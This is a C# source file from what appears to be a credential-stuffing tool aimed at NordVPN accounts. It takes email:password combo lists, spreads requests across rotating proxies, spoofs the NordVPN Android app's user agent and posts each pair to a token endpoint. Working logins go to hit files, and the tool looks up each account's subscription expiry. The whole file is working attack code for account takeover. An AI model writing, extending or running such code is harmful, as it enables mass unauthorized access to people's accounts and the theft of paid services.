using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using AuthGG;
using Leaf.xNet;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using ZuttPal;
using Console = Colorful.Console;
using StringContent = System.Net.Http.StringContent;

namespace ZuttPal
{
	internal class nordvpn
	{
		public static string Path;
		private static ReaderWriterLockSlim locker = new ReaderWriterLockSlim();



		public static void startchecker2()
		{
			for (; ; )
			{
				while (!Checking15.Combo.IsEmpty)
				{
					using (HttpRequest httpRequest = new HttpRequest())
					{
						if (Checking15.Combo.TryDequeue(out string acc))
						{
							try
							{
								var array = acc.Split(new char[3] { ':', ';', '|' });
								var email = array[0];
								var password = array[1];
								string account = email + ":" + password;
								httpRequest.Proxy = Checking15.RandomProxies();
								httpRequest.IgnoreProtocolErrors = true;
								httpRequest.KeepAlive = true;
								httpRequest.ConnectTimeout = Program.config.timeout;
								httpRequest.IgnoreProtocolErrors = true;
								httpRequest.SslProtocols = System.Security.Authentication.SslProtocols.Tls12;
								httpRequest.AllowAutoRedirect = false;
								httpRequest.AddHeader("User-Agent", "NordApp android (playstore/2.8.6) Android 9.0.0");
								string login = httpRequest.Post("https://zwyr157wwiu6eior.com/v1/users/tokens", $"username={email}&password={password}", "application/x-www-form-urlencoded").ToString();
								if (login.Contains("Unauthorized"))
								{
									Interlocked.Increment(ref Checking15.CheckedLines);
									Interlocked.Increment(ref Checking15.currentCpm);
									Interlocked.Increment(ref Checking15.Bad);
									if (Program.config.printbad == "True")
									{
										Colorful.Console.WriteLine("[»] Invalid " + account, Color.Red);
									}
									break;
								}
								else if (login.Contains("user_id"))
								{
									Interlocked.Increment(ref Checking15.CheckedLines);
									Interlocked.Increment(ref Checking15.currentCpm);
									Interlocked.Increment(ref Checking15.Hits);
									Save(Path + "\\NoCapHits.txt", acc);
									string str1 = nordvpn.Base64Encode("token:" + Regex.Match(login, "token\":\"(.*?)\"").Groups[1].Value);
									httpRequest.Authorization = "Basic " + str1;
									string str2 = httpRequest.Get("https://zwyr157wwiu6eior.com/v1/users/services").ToString();
									string str3 = "Expiration Date: ";
									if (str2.Contains("expires_at"))
									{
										foreach (JToken jtoken in (JArray)JsonConvert.DeserializeObject(str2))
										{
											if ((string)jtoken[(object)"service"][(object)"name"] == "VPN")
											{
												if (DateTime.UtcNow < DateTime.ParseExact(jtoken[(object)"expires_at"].ToString().Split(' ')[0], "yyyy-MM-dd", (IFormatProvider)CultureInfo.InvariantCulture))
													str3 = "Expiration Date: " + jtoken[(object)"expires_at"].ToString().Split(' ')[0];
												else
													str3 = "Expired";
											}
										}
									}
									if (str3 == "Expired")
                                    {
										Save(Path + "\\Expired.txt", acc);
										if (Program.config.printgood == "True")
										{
											Colorful.Console.WriteLine("[»] Expired " + acc, Color.Yellow);
										}
									}
									if (str3 != "Expired")
                                    {
										if (str3.Contains("-"))
                                        {
											string yes = account + " - " + str3;
											Save(Path + "\\Hits.txt", yes);
											if (Program.config.printgood == "True")
											{
												Colorful.Console.WriteLine("[»] Valid " + yes, Color.Green);
											}
											break;
										}
										else
                                        {
											break;
                                        }
									}
								}
								else if (!login.Contains("user_id") || !login.Contains("Unauthorized"))
                                {
									string acc1 = email + ":" + password;
									Checking11.Combo.Enqueue(acc1);
									Interlocked.Increment(ref Checking11.retry);
									break;
								}

							}
							catch (Exception)
							{
								var array = acc.Split(new char[3] { ':', ';', '|' });
								var email = array[0];
								var password = array[1];
								var account = email + password;
								string acc1 = email + ":" + password;
								Checking11.Combo.Enqueue(acc1);
								Interlocked.Increment(ref Checking11.retry);
								break;
							}
						}	
					}
				}
			}
		}

		public static string yey(string source, string left, string right)
		{
			return source.Split(new string[]
			{
				left
			}, StringSplitOptions.None)[1].Split(new string[]
			{
				right
			}, StringSplitOptions.None)[0];
		}
		public static void Save(string path, string line)
			{
			for (; ; )
			{
				try
				{
					File.AppendAllLines(path ?? "", new List<string>
					{
						line
					}, Encoding.UTF8);
					break;
				}
				catch
				{
				}
			}
		}
		public static string Base64Encode(string plainText) => Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));

		public static string uri = "";

		public static string auther = "";

		public static string printbad = "";

		public static string printlocked = "";

		public static List<string> Tokens = new List<string>();

		public static List<string> Urls = new List<string>();

		public static List<string> Auther = new List<string>();

		public static List<ProxyClient> ProxyList = new List<ProxyClient>();
	}
}
